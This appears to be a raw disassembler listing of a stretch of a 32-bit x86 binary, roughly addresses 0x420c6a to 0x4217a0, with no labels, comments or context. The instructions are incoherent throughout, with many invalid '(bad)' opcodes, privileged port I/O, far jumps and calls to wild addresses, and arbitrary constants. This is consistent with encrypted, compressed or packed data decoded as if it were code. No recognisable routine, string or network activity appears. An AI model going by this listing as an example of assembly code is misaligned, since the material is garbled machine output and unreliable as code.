  420c6a:	bound  eax,QWORD PTR [esi-0x25]
	...
  420cd5:	add    BYTE PTR [edx-0x604ef4eb],cl
  420cdb:	mov    edi,0x886e3fba
  420ce0:	add    ebp,esp
  420ce2:	fidivr DWORD PTR [ebx+eax*4]
  420ce5:	test   esi,ebx
  420ce7:	pop    edi
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	inc    DWORD PTR [eax]
  420cec:	add    BYTE PTR [eax],al
  420cee:	xchg   DWORD PTR [edi],eax
  420cf0:	test   eax,0x740fe99b
  420cf5:	lahf   
  420cf6:	test   BYTE PTR ds:0x7dcc8d43,0xd5
  420cfd:	es retf 
  420cff:	dec    eax
  420d00:	lahf   
  420d01:	dec    esi
  420d02:	mov    bl,0x19
  420d04:	ret    
  420d05:	and    dl,BYTE PTR [ebx+0x7e]
  420d08:	call   0x7edee9e2
  420d0d:	stos   DWORD PTR es:[edi],eax
  420d0e:	gs ins BYTE PTR es:[edi],dx
  420d10:	push   ds
  420d11:	mov    al,0x4f
  420d13:	dec    esp
  420d14:	outs   dx,BYTE PTR ds:[esi]
  420d15:	add    cl,BYTE PTR [edx]
  420d17:	ds dec eax
  420d19:	sbb    edx,DWORD PTR [edx+ebx*8-0x657caa3a]
  420d20:	xchg   DWORD PTR [edx+eiz*4-0x70],edi
  420d24:	(bad)  
  420d25:	sbb    DWORD PTR [esi-0x45c2bd24],eax
  420d2b:	fimul  WORD PTR [edx]
  420d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d2e:	mov    ebp,es
  420d30:	mov    cl,0xb8
  420d32:	push   ecx
  420d33:	ins    DWORD PTR es:[edi],dx
  420d34:	adc    eax,esi
  420d36:	and    eax,0xada55ee2
  420d3b:	mov    al,ds:0x291a4468
  420d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d41:	xchg   ecx,eax
  420d42:	add    BYTE PTR [esi-0x6f6967e0],ah
  420d48:	cmc    
  420d49:	call   0xa57414c8
  420d4e:	mov    al,ds:0xfbcc89af
  420d53:	sbb    eax,0xc2910064
  420d58:	std    
  420d59:	mov    dl,0x60
  420d5b:	jle    0x420d5b
  420d5d:	pop    es
  420d5e:	(bad)  
  420d5f:	call   0xd085f795
  420d64:	call   0x7abe1cb5
  420d69:	scas   eax,DWORD PTR es:[edi]
  420d6a:	icebp  
  420d6b:	mov    bh,0xe8
  420d6d:	jmp    0x2e110cf0
  420d72:	loopne 0x420d0f
  420d74:	(bad)  
  420d75:	je     0x420d56
  420d77:	arpl   di,si
  420d79:	mov    eax,0x4cde0b4f
  420d7e:	mov    edi,0xc7ec39b2
  420d83:	jbe    0x420d7f
  420d85:	sbb    ebx,ebp
  420d87:	fnstcw WORD PTR [edi-0x33]
  420d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d8b:	adc    DWORD PTR [eax],ebx
  420d8d:	mov    dl,0xff
  420d8f:	ja     0x420d6b
  420d91:	ds push ds
  420d93:	test   DWORD PTR [esp+edi*4],ecx
  420d96:	mov    dl,0x9e
  420d98:	imul   esi,edx,0xd9f435ad
  420d9e:	(bad)  
  420d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420da0:	xchg   BYTE PTR [ebx],dl
  420da2:	xchg   edi,eax
  420da3:	adc    dl,BYTE PTR [ecx+0x2c]
  420da6:	mov    ecx,edx
  420da8:	add    ecx,DWORD PTR [edx+0x54c08cd8]
  420dae:	push   ebp
  420daf:	sbb    DWORD PTR [ebp+0x165c0f13],esi
  420db5:	cmp    al,0xd2
  420db7:	jge    0x420d53
  420db9:	adc    esi,edx
  420dbb:	cwde   
  420dbc:	repz (bad) 
  420dbf:	fst    QWORD PTR [eax+ebp*2+0x1c749259]
  420dc6:	test   BYTE PTR [edi],cl
  420dc8:	mov    BYTE PTR ds:0x75193162,dl
  420dce:	dec    esp
  420dcf:	mov    ah,0x49
  420dd1:	dec    ecx
  420dd2:	jmp    0x3f00c19a
  420dd7:	dec    esi
  420dd8:	mov    DWORD PTR [ecx],ebp
  420dda:	in     eax,dx
  420ddb:	icebp  
  420ddc:	aam    0xb1
  420dde:	xor    eax,0xb98f8392
  420de3:	mov    eax,0x13ca2a97
  420de8:	xor    DWORD PTR [ebx+0x6ad8c2],ebx
	...
  420e56:	out    0x1e,eax
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xa50cac91
  420e66:	frstor [eax+0x1]
  420e69:	add    bh,bh
  420e6b:	add    BYTE PTR [eax],al
  420e6d:	add    BYTE PTR [esi-0x22d89c4],dh
  420e73:	fldcw  WORD PTR [ebx+0x7a064435]
  420e79:	inc    esi
  420e7a:	cs or  ah,dh
  420e7d:	leave  
  420e7e:	mov    al,0xd6
  420e80:	fistp  QWORD PTR [edx+0x13]
  420e83:	loopne 0x420e44
  420e85:	push   edx
  420e86:	inc    edx
  420e87:	sub    al,0xb5
  420e89:	sahf   
  420e8a:	in     al,0xee
  420e8c:	in     eax,dx
  420e8d:	loopne 0x420e26
  420e8f:	xor    BYTE PTR [esi],dh
  420e91:	call   0x2768:0xd57ae1f2
  420e98:	sub    DWORD PTR [edx],ebp
  420e9a:	outs   dx,BYTE PTR ds:[esi]
  420e9b:	ror    BYTE PTR [edx-0x60],cl
  420e9e:	push   esi
  420e9f:	rdtsc  
  420ea1:	xchg   ecx,eax
  420ea2:	xlat   BYTE PTR ds:[ebx]
  420ea3:	mov    ah,0xba
  420ea5:	mov    al,0xe2
  420ea7:	enter  0x8a62,0xe3
  420eab:	jmp    0x420ece
  420ead:	cmp    eax,0x4d078957
  420eb2:	cmp    BYTE PTR [edx],bh
  420eb4:	cld    
  420eb5:	fdivr  QWORD PTR [esi-0x73]
  420eb9:	iret   
  420eba:	iret   
  420ebb:	cld    
  420ebc:	bound  edi,QWORD PTR [ebx+0x7d]
  420ebf:	rcl    DWORD PTR [esi-0x50a9fae4],1
  420ec5:	inc    eax
  420ec6:	out    0x97,eax
  420ec8:	or     eax,0x559052
  420ecd:	push   es
  420ece:	add    DWORD PTR [ecx],edx
  420ed0:	mov    BYTE PTR [ebx+ebp*4],cl
  420ed3:	adc    ah,BYTE PTR [eax]
  420ed5:	push   edx
  420ed6:	xor    al,0xb6
  420ed8:	ss pop esp
  420eda:	(bad)  
  420edb:	xor    esp,DWORD PTR [edi+0x6cbe7c92]
  420ee1:	mov    cl,0x5
  420ee3:	sub    eax,0xcfe89373
  420ee8:	push   ecx
  420ee9:	mov    eax,fs:0xc6f5cb5c
  420eef:	fwait
  420ef0:	adc    ah,BYTE PTR [ecx+edx*4]
  420ef3:	jo     0x420f60
  420ef5:	sbb    eax,0xc95417c4
  420efa:	cmp    eax,0x5c63032
  420eff:	dec    ebp
  420f00:	pop    ebx
  420f01:	retf   0x912f
  420f04:	fucomip st,st(5)
  420f06:	push   0xffffffcb
  420f08:	jnp    0x420f6d
  420f0a:	xor    al,0x9f
  420f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f0d:	pop    esi
  420f0e:	xor    esp,DWORD PTR [ebx-0x458a5adb]
  420f14:	adc    ecx,DWORD PTR es:[ebx-0xe]
  420f18:	inc    edx
  420f19:	out    dx,eax
  420f1a:	sahf   
  420f1b:	pop    eax
  420f1c:	or     esp,DWORD PTR [esi+0xc01f908]
  420f22:	sub    al,0x9
  420f24:	pop    edx
  420f25:	cli    
  420f26:	mov    eax,eax
  420f28:	inc    esi
  420f29:	add    esp,DWORD PTR [ebp+0x70]
  420f2c:	and    ax,0x267
  420f30:	inc    esp
  420f31:	pusha  
  420f32:	xchg   ebp,eax
  420f33:	mov    cl,BYTE PTR [esi]
  420f35:	mov    ecx,0x2d4dd2ee
  420f3a:	pop    eax
  420f3b:	loope  0x420f0a
  420f3d:	rcr    BYTE PTR gs:[ecx-0x42],cl
  420f41:	arpl   WORD PTR [edi],ax
  420f43:	inc    ebp
  420f44:	bound  edx,QWORD PTR [ebx-0x90bd9fd]
  420f4a:	rcl    DWORD PTR [edx+eax*4],cl
  420f4d:	add    ch,cl
  420f4f:	ins    DWORD PTR es:[edi],dx
  420f50:	add    eax,DWORD PTR [eax-0xa]
  420f53:	dec    ecx
  420f54:	push   esp
  420f55:	xor    eax,0x5d05f8ae
  420f5a:	mov    ebx,0x8a654716
  420f5f:	jg     0x420f28
  420f61:	dec    ebx
  420f62:	adc    dl,cl
  420f64:	mov    ebp,0x2cc7bb1b
  420f69:	jns    0x420fbf
  420f6b:	scas   al,BYTE PTR es:[edi]
  420f6c:	mov    es,WORD PTR [eax]
	...
  420fd6:	and    BYTE PTR [edi-0x28082cbe],dl
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0xe10bc93]
  420fe6:	fsub   QWORD PTR [ecx+0x1]
  420fe9:	add    bh,bh
  420feb:	add    BYTE PTR [eax],al
  420fed:	add    BYTE PTR [esi-0x40],ch
  420ff0:	jle    0x197c5683
  420ff6:	xchg   BYTE PTR ds:0x57a15f7f,dl
  420ffc:	icebp  
  420ffd:	or     ecx,edx
  420fff:	add    eax,0x47d3c4a1
  421004:	jno    0x420ff6
  421006:	ret    
  421007:	cld    
  421008:	call   0xbb76:0xd3946c46
  42100f:	jl     0x421083
  421011:	arpl   WORD PTR [ebp+0x36],di
  421014:	jbe    0x42108c
  421016:	cs das 
  421018:	jbe    0x421061
  42101a:	adc    al,0x51
  42101c:	sbb    al,0x32
  42101e:	or     BYTE PTR [ecx],al
  421020:	test   BYTE PTR [edx-0x23],dh
  421023:	xchg   ecx,eax
  421024:	sbb    al,0x8a
  421026:	idiv   di
  421029:	jo     0x421075
  42102b:	adc    DWORD PTR [edx+0x641cec30],edi
  421031:	nop
  421032:	rol    DWORD PTR [eax],0x38
  421035:	pop    esp
  421036:	jg     0x421002
  421038:	sbb    BYTE PTR [eax],dh
  42103a:	outs   dx,DWORD PTR ds:[esi]
  42103b:	es (bad) 
  42103d:	xchg   ebx,eax
  42103e:	out    dx,al
  42103f:	rol    DWORD PTR [eax],0x3
  421042:	jecxz  0x4210b8
  421044:	pop    esp
  421045:	jg     0x4210c3
  421047:	lock (bad) 
  421049:	lea    ebp,[esi+0x40]
  42104c:	mov    ebx,DWORD PTR [ebp+ebp*2-0x1c72c575]
  421053:	mov    ah,0x5f
  421055:	jae    0x421019
  421057:	jle    0x42107b
  421059:	stc    
  42105a:	pusha  
  42105b:	inc    BYTE PTR [edi-0x2a015a7]
  421061:	jns    0x4210d5
  421063:	sub    DWORD PTR [eax+edx*8+0x50],edi
  421067:	pop    esp
  421068:	js     0x421010
  42106a:	repz mov dh,0xd7
  42106d:	mov    bh,0xa7
  42106f:	ret    0xaa67
  421072:	ss mov dl,0xe4
  421075:	retf   0xdca4
  421078:	and    eax,0xd65bec64
  42107d:	repnz sub eax,0xb06de7f2
  421083:	sub    al,0xcb
  421085:	out    dx,al
  421086:	mov    al,ds:0x423576fc
  42108b:	ds jmp 0x211f:0x36b6
  421092:	mov    dl,0x6
  421094:	pop    ebx
  421095:	sub    eax,0x1c9e893a
  42109a:	push   esi
  42109b:	pop    ss
  42109c:	div    BYTE PTR [ecx-0xbd8211]
  4210a2:	imul   eax,ebp,0xffffffe8
  4210a5:	out    dx,al
  4210a6:	fbstp  TBYTE PTR [ecx]
  4210a8:	scas   al,BYTE PTR es:[di]
  4210aa:	dec    ebx
  4210ab:	xor    eax,0x56b4c8ab
  4210b0:	mov    ?,WORD PTR [eax]
  4210b2:	nop
  4210b3:	(bad)  
  4210b4:	pop    di
  4210b6:	fistp  DWORD PTR [edi+0x57]
  4210b9:	cmp    al,0x48
  4210bb:	xchg   esp,eax
  4210bc:	hlt    
  4210bd:	ja     0x421073
  4210bf:	mov    esi,0xba425762
  4210c4:	push   edi
  4210c5:	faddp  st(7),st
  4210c7:	popa   
  4210c8:	and    eax,0xcff2401e
  4210cd:	repnz cmc 
  4210cf:	mov    ebp,0x7fac9f40
  4210d4:	std    
  4210d5:	into   
  4210d6:	cmp    DWORD PTR [ebx-0x2e],0xe
  4210da:	push   ebx
  4210db:	adc    ecx,ebx
  4210dd:	int3   
  4210de:	cs je  0x421096
  4210e1:	rcr    DWORD PTR [ecx-0x59],cl
  4210e4:	sub    eax,0x603376e1
  4210e9:	add    dh,BYTE PTR [ebx+0xf818]
	...
  421153:	add    BYTE PTR [eax],al
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    es,WORD PTR [eax-0x24506cce]
  421167:	bound  eax,QWORD PTR [ecx]
  421169:	add    bh,bh
  42116b:	add    BYTE PTR [eax],al
  42116d:	add    BYTE PTR [edi],ah
  42116f:	mov    ecx,0x6f32e753
  421174:	cmp    al,0xab
  421176:	ds out dx,al
  421178:	dec    edx
  421179:	add    dl,BYTE PTR cs:[ebx+0x62ce1e32]
  421180:	jp     0x42111e
  421182:	clc    
  421183:	xchg   DWORD PTR [eax],edi
  421185:	mov    edx,0xa9ebea8d
  42118a:	retf   0x58c0
  42118d:	mov    esp,0xb3a8935e
  421192:	fst    DWORD PTR [ecx-0x28d36b7]
  421198:	pop    ss
  421199:	jbe    0x421213
  42119b:	mov    ah,bh
  42119d:	gs loop 0x421179
  4211a0:	cs retf 0x1c4c
  4211a4:	mul    edi
  4211a6:	dec    edi
  4211a7:	mov    eax,0x124a1b4f
  4211ac:	pop    esi
  4211ad:	cdq    
  4211ae:	adc    di,WORD PTR [ecx-0x33]
  4211b2:	jmp    0x42122a
  4211b4:	mov    WORD PTR [edi+0x68b8c9ba],ss
  4211ba:	mov    al,0x1
  4211bc:	fnstsw WORD PTR [edi]
  4211be:	stos   DWORD PTR es:[edi],eax
  4211bf:	bound  esp,QWORD PTR [edx-0x1b]
  4211c2:	mov    ebp,DWORD PTR [ecx+0x4d]
  4211c5:	(bad)  
  4211c6:	fs inc edx
  4211c8:	arpl   WORD PTR [ecx+edi*2+0x3a],si
  4211cc:	inc    ebx
  4211cd:	mov    ds:0x322949dd,al
  4211d2:	test   BYTE PTR [eax-0x50],bl
  4211d5:	clc    
  4211d6:	popf   
  4211d7:	and    BYTE PTR [ecx+edx*8],dh
  4211da:	sti    
  4211db:	mov    ecx,DWORD PTR [ebx]
  4211dd:	das    
  4211de:	add    BYTE PTR [edi-0x12],dl
  4211e1:	rcl    ebp,1
  4211e3:	scas   eax,DWORD PTR es:[edi]
  4211e4:	adc    esi,DWORD PTR [ebx]
  4211e6:	push   es
  4211e7:	jb     0x4211f3
  4211e9:	or     edx,0xe0e5fbe8
  4211ef:	sub    eax,0x52ba23e6
  4211f4:	mov    al,0xda
  4211f6:	sub    al,0x25
  4211f8:	repz shl edi,0x6a
  4211fc:	aad    0xb6
  4211fe:	ss mov eax,0x222edd97
  421204:	shl    DWORD PTR [ebx+eax*1+0x3e],cl
  421208:	pushf  
  421209:	push   eax
  42120a:	push   esp
  42120b:	out    dx,al
  42120c:	pop    ecx
  42120d:	inc    eax
  42120e:	xor    ah,ah
  421210:	sysenter 
  421212:	mov    ecx,0x547b04a4
  421217:	mov    BYTE PTR ss:[esi-0x19],dl
  42121b:	add    al,BYTE PTR [esi]
  42121d:	sbb    eax,0x7f04b932
  421222:	pmaddwd mm6,mm5
  421225:	(bad)  
  421227:	ins    BYTE PTR es:[edi],dx
  421228:	repz leave 
  42122a:	fnstcw WORD PTR [ebx+0x611299c9]
  421230:	sub    al,0x3
  421232:	pop    ebx
  421233:	add    ecx,DWORD PTR [ebx+ecx*4+0x789ec0e4]
  42123a:	sbb    al,0x7f
  42123c:	jmp    0xc1fa:0x64e0f53b
  421243:	mov    al,ds:0x2871f7c6
  421248:	push   cs
  421249:	ss mov esp,0x26476b42
  42124f:	leave  
  421250:	jmp    0x421215
  421252:	test   eax,0xd9ecd4fd
  421257:	aas    
  421258:	lock sub ecx,DWORD PTR [ebx-0x7e]
  42125c:	sti    
  42125d:	scas   al,BYTE PTR es:[edi]
  42125e:	(bad)  
  42125f:	fist   DWORD PTR [esi]
  421261:	ds pop ss
  421263:	push   cs
  421264:	jp     0x421202
  421266:	(bad)  
  421267:	and    BYTE PTR [ecx],0xe1
  42126a:	or     al,0x7
  42126c:	mov    dh,0x0
	...
  4212d6:	sahf   
  4212d7:	pop    ds
  4212d8:	(bad)  
  4212d9:	test   DWORD PTR [edi-0x42800109],0xc17ab32d
  4212e3:	js     0x4212c7
  4212e5:	or     dl,bl
  4212e7:	arpl   WORD PTR [ecx],ax
  4212e9:	add    bh,bh
  4212eb:	add    BYTE PTR [eax],al
  4212ed:	add    BYTE PTR [ebx+0x569877c9],ch
  4212f3:	and    eax,0xd5fcbaa5
  4212f8:	xor    al,0xe5
  4212fa:	mov    edx,0x7667a07c
  4212ff:	ja     0x42136f
  421301:	repz ret 0xdc46
  421305:	xchg   ebx,eax
  421306:	jmp    0x883c:0xdf771630
  42130d:	scas   al,BYTE PTR es:[edi]
  42130e:	ins    BYTE PTR es:[edi],dx
  42130f:	ror    esp,1
  421311:	inc    ecx
  421312:	pop    esi
  421313:	add    dl,BYTE PTR [ecx-0x2f]
  421316:	pop    ecx
  421317:	(bad)  
  421318:	fnsave [edx+ecx*8+0x28]
  42131c:	imul   edx,DWORD PTR [ebx],0xfffffffd
  42131f:	pop    ebx
  421320:	fisubr WORD PTR ss:[ebx]
  421323:	sub    eax,0x411c9092
  421328:	test   eax,0xe344f753
  42132d:	jmp    ebp
  42132f:	(bad)  
  421330:	ror    BYTE PTR [esi+0x58],cl
  421333:	les    ecx,FWORD PTR [ecx+0x76]
  421336:	cli    
  421337:	rcl    BYTE PTR [esi+ebp*8+0x75],0x58
  42133c:	cmp    eax,0xe95c7b7
  421341:	hlt    
  421342:	sbb    eax,DWORD PTR [edx+0x60]
  421345:	xchg   DWORD PTR [edi-0x6666c221],eax
  42134b:	mov    cl,0xa5
  42134d:	(bad)  
  42134e:	js     0x421353
  421350:	sbb    al,0xf0
  421352:	sub    eax,DWORD PTR [edi+0x5b]
  421355:	inc    ebx
  421356:	and    cl,BYTE PTR [edx]
  421358:	(bad)  
  421359:	(bad)
  42135d:	jg     0x421327
  42135f:	repnz mov edi,0xe2441f59
  421365:	outs   dx,BYTE PTR ds:[esi]
  421366:	jbe    0x4213c7
  421368:	mov    edx,cs
  42136a:	jmp    0xeeb3:0xdb8cb758
  421371:	dec    edi
  421372:	mov    DWORD PTR [eax],0xe5c81507
  421378:	and    ebx,DWORD PTR [ebp-0x57]
  42137b:	std    
  42137c:	pop    edi
  42137d:	adc    DWORD PTR [eax+0x7d0e5498],esp
  421383:	and    BYTE PTR [esi],ah
  421385:	imul   BYTE PTR [ebx+eax*4+0x5e3aa7ed]
  42138c:	push   edx
  42138d:	test   DWORD PTR [ebx+0x5ffa88d8],ecx
  421393:	jmp    0xdb9c1902
  421398:	out    0x81,eax
  42139a:	scas   eax,DWORD PTR es:[edi]
  42139b:	inc    esi
  42139c:	xor    al,0xd5
  42139e:	int3   
  42139f:	into   
  4213a0:	cmp    ah,BYTE PTR [ecx-0x1ba9934d]
  4213a6:	jns    0x42140c
  4213a8:	jo     0x4213d2
  4213aa:	popf   
  4213ab:	push   ebp
  4213ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ad:	je     0x42137c
  4213af:	cmp    DWORD PTR [ecx-0x5ae96f61],0xfa60b73b
  4213b9:	mov    eax,ds:0xd84bcbec
  4213be:	mov    esp,edx
  4213c0:	loopne 0x4213a6
  4213c2:	or     eax,0x82428b71
  4213c7:	cs and cl,ch
  4213ca:	fcomp  st(7)
  4213cc:	pop    es
  4213cd:	ret    
  4213ce:	add    BYTE PTR [ecx+0x65],cl
  4213d1:	in     eax,dx
  4213d2:	sahf   
  4213d3:	mov    ebp,0xf17d9cef
  4213d8:	imul   esi,ecx,0x58
  4213db:	xchg   ebp,eax
  4213dc:	cli    
  4213dd:	fwait
  4213de:	add    al,0x66
  4213e0:	stos   BYTE PTR es:[edi],al
  4213e1:	mov    al,ds:0x2af9a1cb
  4213e6:	xlat   BYTE PTR ds:[bx]
  4213e8:	and    dh,BYTE PTR [eax+0x73]
  4213eb:	retf   
  4213ec:	pushf  
	...
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x3bc3f49f]
  421464:	xchg   esi,eax
  421465:	cld    
  421466:	fldenv [ecx+eax*1+0x0]
  42146a:	inc    DWORD PTR [eax]
  42146c:	add    BYTE PTR [eax],al
  42146e:	adc    DWORD PTR [eax],esi
  421470:	(bad)  
  421471:	(bad)  
  421473:	out    0x88,eax
  421475:	mov    ebp,0x6f414d3
  42147a:	scas   eax,DWORD PTR es:[edi]
  42147b:	mov    esi,0x2b4083d5
  421480:	dec    ebx
  421481:	out    dx,al
  421482:	lds    eax,FWORD PTR [edx+0x153e2884]
  421488:	sbb    eax,0x6411cf1f
  42148d:	mov    ebx,0x9e95db7f
  421492:	cmp    al,BYTE PTR [eax+0x12]
  421495:	scas   eax,DWORD PTR es:[edi]
  421496:	ins    DWORD PTR es:[edi],dx
  421497:	ds out 0xb6,al
  42149a:	shl    ecx,cl
  42149c:	loope  0x4214d6
  42149e:	(bad)  
  42149f:	xor    edi,esp
  4214a1:	mov    cl,0x5a
  4214a3:	shl    BYTE PTR [ecx*4+0x7f9d2987],0x91
  4214ab:	in     al,dx
  4214ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214ad:	pop    esi
  4214ae:	push   cs
  4214af:	js     0x4214d9
  4214b1:	jg     0x4214ec
  4214b3:	ret    
  4214b4:	adc    edx,ebx
  4214b6:	mov    esp,0xefef3c23
  4214bb:	sub    edx,DWORD PTR [edi]
  4214bd:	push   esi
  4214be:	sbb    bh,ah
  4214c0:	or     DWORD PTR [edi],ecx
  4214c2:	jbe    0x421490
  4214c4:	jno    0x421540
  4214c6:	jne    0x421474
  4214c8:	iret   
  4214c9:	mov    ebx,0x8ee03871
  4214ce:	sub    edi,DWORD PTR [esi+0x7c397ca2]
  4214d4:	xor    DWORD PTR [esi+0x7a4795ec],0x20
  4214db:	test   ah,bl
  4214dd:	or     DWORD PTR [ebx-0x1582eb12],edx
  4214e3:	imul   esi,edx,0x39
  4214e6:	bound  esi,QWORD PTR [ebx-0x2ee62425]
  4214ec:	clc    
  4214ed:	addr16 or esp,edx
  4214f0:	sub    BYTE PTR [eax],ah
  4214f2:	dec    edi
  4214f3:	inc    esi
  4214f4:	xchg   edx,eax
  4214f5:	mov    al,ds:0x4c13e1df
  4214fa:	fild   WORD PTR [ebx]
  4214fc:	inc    ebp
  4214fd:	stos   DWORD PTR es:[edi],eax
  4214fe:	xor    bl,BYTE PTR [ecx]
  421500:	pop    ss
  421501:	iret   
  421502:	dec    esp
  421503:	and    bl,BYTE PTR [esi-0x14c306af]
  421509:	xor    eax,0x9243bed1
  42150e:	fidivr WORD PTR [edx]
  421510:	sub    ah,bh
  421512:	sbb    BYTE PTR [esi+0x76826d5c],bl
  421518:	outs   dx,BYTE PTR ds:[esi]
  421519:	stos   BYTE PTR es:[edi],al
  42151a:	jne    0x42151e
  42151c:	jl     0x4214cd
  42151e:	dec    ecx
  42151f:	out    0x1d,al
  421521:	mov    eax,0xbd0930d8
  421526:	popf   
  421527:	pop    ebx
  421528:	iret   
  421529:	dec    esi
  42152a:	jg     0x421516
  42152c:	shl    BYTE PTR [ebx-0x33],cl
  42152f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421530:	cmp    edx,DWORD PTR [edx+0x5b]
  421533:	jne    0x421503
  421535:	sbb    ebx,DWORD PTR [ecx]
  421537:	adc    DWORD PTR [ebx+0x58],edx
  42153a:	pop    ds
  42153b:	arpl   dx,si
  42153d:	popf   
  42153e:	sbb    DWORD PTR [eax+0x42],ebx
  421541:	fistp  WORD PTR ds:0x2afea84a
  421548:	retf   
  421549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42154a:	adc    BYTE PTR [esi],cl
  42154c:	mov    bl,0x22
  42154e:	adc    BYTE PTR [edx-0x40],al
  421551:	retf   0xe52a
  421554:	sbb    cl,0x40
  421557:	mov    edx,0x41979675
  42155c:	pop    esp
  42155d:	cmp    BYTE PTR [ecx],dh
  42155f:	fs cld 
  421561:	pop    ebp
  421562:	add    cl,BYTE PTR [edx]
  421564:	call   0xb359:0x43f435ba
  42156b:	jmp    0x0:0x50
	...
  4215d6:	(bad)  
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x634342b4],bp
  4215e4:	mov    dh,bh
  4215e6:	fsub   DWORD PTR [ebp+0x1]
  4215e9:	add    bh,bh
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [ebp-0x67d5041b],dh
  4215f3:	cmp    al,0xf6
  4215f5:	hlt    
  4215f6:	add    eax,0xf632bc91
  4215fb:	scas   al,BYTE PTR es:[edi]
  4215fc:	loopne 0x42161b
  4215fe:	mov    al,ds:0x1b2cae7c
  421603:	push   0xd540c860
  421608:	xor    eax,0xcb87f364
  42160d:	dec    esi
  42160e:	xchg   edx,eax
  42160f:	mov    ch,0x77
  421611:	xor    esi,DWORD PTR [ecx+0x69a860c5]
  421617:	jecxz  0x421664
  421619:	mov    dl,0xe3
  42161b:	mov    esp,0x23aedc21
  421620:	and    esi,DWORD PTR [ebp-0x68e7ec7e]
  421626:	or     al,0xef
  421628:	add    DWORD PTR [esi+0x3dac6023],ebx
  42162e:	lea    ecx,[ebx+0x58059ae5]
  421634:	dec    esp
  421635:	push   ebx
  421636:	icebp  
  421637:	inc    ebx
  421638:	mov    cl,0x6d
  42163a:	ja     0x42161a
  42163c:	rol    BYTE PTR [edx],0x93
  42163f:	mov    al,0xc0
  421641:	fisub  WORD PTR ss:[edx]
  421644:	mov    eax,ds:0x2c8ccbfb
  421649:	mov    es:0x6aafa7fb,al
  42164f:	cdq    
  421650:	jb     0x4216b3
  421652:	call   0xf198ddec
  421657:	pop    edi
  421658:	mov    ebp,0xbab3a36e
  42165d:	inc    edi
  42165e:	in     eax,dx
  42165f:	xchg   esi,eax
  421660:	mov    esi,0x36d6b721
  421665:	js     0x42169b
  421667:	push   0xffffffea
  421669:	adc    dl,cl
  42166b:	clc    
  42166c:	cmp    eax,0x2e3e376e
  421671:	lahf   
  421672:	jp     0x4216e6
  421674:	inc    eax
  421675:	mov    WORD PTR [ecx-0x5b],cs
  421678:	and    al,dl
  42167a:	add    eax,0xd4885ab0
  42167f:	out    dx,al
  421680:	mov    DWORD PTR [eax+eax*1],ebp
  421683:	inc    bx
  421685:	pop    ebp
  421686:	mov    ah,0xb2
  421688:	icebp  
  421689:	pop    esp
  42168a:	or     eax,0x9b7ce2d7
  42168f:	xchg   edx,eax
  421690:	call   0xd58c:0x91e8cb43
  421697:	cmp    bh,al
  421699:	sbb    esi,DWORD PTR [edx]
  42169b:	pop    ebp
  42169c:	jg     0x42164a
  42169e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42169f:	xor    al,0x3b
  4216a1:	aas    
  4216a2:	stos   DWORD PTR es:[edi],eax
  4216a3:	cmp    al,0xa9
  4216a5:	fisubr WORD PTR [eax+0xd]
  4216a8:	jae    0x421651
  4216aa:	pop    ebp
  4216ab:	xchg   esi,eax
  4216ac:	stc    
  4216ad:	stos   BYTE PTR es:[edi],al
  4216ae:	and    eax,0x405b091f
  4216b3:	js     0x4216e0
  4216b5:	jbe    0x4216a5
  4216b7:	ins    BYTE PTR es:[edi],dx
  4216b8:	bound  eax,QWORD PTR [esi+0x29783027]
  4216be:	es inc ecx
  4216c0:	lds    edi,FWORD PTR [esi]
  4216c2:	or     al,0x86
  4216c4:	mov    ecx,edi
  4216c6:	xor    al,0xe7
  4216c8:	mov    DWORD PTR fs:[ebx+0x9],esi
  4216cc:	adc    ah,0x7f
  4216cf:	mov    edi,0xa3534a4d
  4216d4:	mov    DWORD PTR [edi],esi
  4216d6:	test   eax,0xe8b6075
  4216db:	mov    edi,0xc2a0a3e0
  4216e0:	jl     0x421741
  4216e2:	mov    dl,0x91
  4216e4:	arpl   WORD PTR [ecx],di
  4216e6:	mov    esp,0x742c80ba
  4216eb:	aam    0x45
	...
  421755:	add    BYTE PTR [ebx-0x105512d4],ch
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	jg     0x4217dc
  421764:	aaa    
  421765:	or     edi,edx
  421767:	add    WORD PTR [eax],ax
  42176a:	inc    DWORD PTR [eax]
  42176c:	add    BYTE PTR [eax],al
  42176e:	(bad)  
  42176f:	cmp    eax,0x534284d2
  421774:	fs jo  0x421723
  421777:	out    0x7,al
  421779:	push   edx
  42177a:	dec    eax
  42177b:	or     BYTE PTR [edx],0x9a
  42177e:	or     eax,0x50898b56
  421783:	out    0x9e,al
  421785:	in     eax,dx
  421786:	adc    edi,ebx
  421788:	test   al,0x7f
  42178a:	stos   BYTE PTR es:[edi],al
  42178b:	ja     0x42178b
  42178d:	pop    ecx
  42178e:	int3   
  42178f:	rol    BYTE PTR [edx-0x2d0adedc],cl
  421795:	ret    
  421796:	aam    0x3
  421798:	or     al,0xab
  42179a:	(bad)  
  42179b:	or     esp,ecx
  42179d:	ss inc esp
  42179f:	pop    esi
  4217a0:	mov    dh,0x21
